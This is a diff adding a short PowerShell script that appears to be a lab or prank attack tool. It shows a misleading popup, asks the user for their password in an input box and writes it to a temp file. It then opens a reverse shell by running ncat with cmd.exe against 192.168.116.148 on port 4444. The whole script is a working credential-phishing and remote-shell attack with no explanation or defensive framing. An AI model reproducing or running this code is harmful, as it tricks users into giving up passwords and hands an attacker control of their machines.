@@ -1,0 +1,11 @@
+##Starts Popup##
+$shell =New-Object -ComObject WScript.Shell
+$shell.Popup("This is is good pop up don't worry man",0,"Don't Click Abort, If you click abort we will need your password",2+32)
+##
+Add-Type -AssemblyName Microsoft.VisualBasic
+$password = [Microsoft.VisualBasic.Interaction]::InputBox('Enter your password please', 'User')
+##Asks User for Password##
+$filePath = "$env:USERPROFILE\AppData\Local\Temp\80992024$.txt"
+Add-Content -Path $filePath -value $password
+##Begin Reverse Shell Process##
+ncat -nv 192.168.116.148 4444 -e cmd.exe
